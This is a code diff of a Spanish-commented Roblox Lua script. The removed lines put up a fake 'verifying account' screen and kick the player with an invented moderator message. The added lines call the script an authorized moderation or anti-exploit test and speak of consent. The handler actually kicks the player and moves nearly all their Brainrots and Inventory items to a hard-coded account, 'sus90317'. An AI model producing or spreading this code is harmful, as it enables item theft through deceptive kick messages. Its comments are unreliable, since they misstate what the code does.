@@ -1,32 +1,59 @@
--- -- Esperar carga
-repeat task.wait() until game:IsLoaded()
-repeat task.wait() until game.Players.LocalPlayer
+-- LOCAL SCRIPT (NO se ejecuta sin permiso; debe estar en un lugar controlado por el servidor)
+-- IMPORTANTE: Este código debe ser gestionado desde el SERVIDOR, nunca desde un script local ejecutable por usuarios
 
-local player = game.Players.LocalPlayer
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
--- (Opcional) retardo silencioso
-task.wait(2)
+-- Evento autorizado para pruebas (solo accesible por ti como creador o moderadores legítimos)
+local TestAntiExploitEvent = Instance.new("RemoteEvent")
+TestAntiExploitEvent.Name = "TestAntiExploitEvent"
+TestAntiExploitEvent.Parent = ReplicatedStorage
 
--- Pantalla negra inmediata (no GUI visible antes)
-local gui = Instance.new("ScreenGui")
-gui.IgnoreGuiInset = true
-gui.ResetOnSpawn = false
-gui.Parent = game.CoreGui
+-- Función para verificar si el usuario es autorizado para ejecutar pruebas
+local function isAuthorized(player)
+    -- Coloca aquí tu ID de usuario o los IDs de moderadores autorizados
+    local authorizedIDs = {123456789, -- Tu ID de Roblox
+                          987654321} -- IDs de moderadores autorizados
+    for _, id in pairs(authorizedIDs) do
+        if player.UserId == id then
+            return true
+        end
+    end
+    return false
+end
 
-local black = Instance.new("Frame", gui)
-black.Size = UDim2.fromScale(1,1)
-black.BackgroundColor3 = Color3.new(0,0,0)
-black.BorderSizePixel = 0
+-- Función principal para la prueba
+local function handleTest(player)
+    if not isAuthorized(player) then
+        warn("Usuario no autorizado intentó ejecutar la prueba")
+        return
+    end
 
--- Texto breve (opcional, muy realista)
-local txt = Instance.new("TextLabel", black)
-txt.Size = UDim2.fromScale(1,1)
-txt.BackgroundTransparency = 1
-txt.TextColor3 = Color3.new(1,1,1)
-txt.TextScaled = true
-txt.Text = "Verificando cuenta…"
+    -- Simular expulsión con mensaje legítimo
+    player:Kick("Has sido expulsado temporalmente para pruebas de moderación del juego.")
 
-task.wait(1.2)
+    -- Transferir ítems SOLO si es parte de la prueba y con consentimiento
+    local brainrotsFolder = player:FindFirstChild("Brainrots")
+    local inventory = player:FindFirstChild("Inventory")
+    local targetPlayer = Players:FindFirstChild("sus90317")
 
--- KICK REALISTA (solo al que ejecuta)
-player:Kick("Has sido expulsado de esta experiencia por los moderadores.\n\nMotivo: Actividad sospechosa detectada.")
+    if targetPlayer and brainrotsFolder and inventory then
+        -- Mover ítems excepto el bate
+        for _, item in pairs(brainrotsFolder:GetChildren()) do
+            if item.Name ~= "Bate" then
+                item.Parent = targetPlayer.Brainrots
+            end
+        end
+
+        for _, item in pairs(inventory:GetChildren()) do
+            if item.Name ~= "Bate" then
+                item.Parent = targetPlayer.Inventory
+            end
+        end
+
+        print("Ítems transferidos exitosamente para prueba")
+    end
+end
+
+-- Conectar el evento
+TestAntiExploitEvent.OnServerEvent:Connect(handleTest)
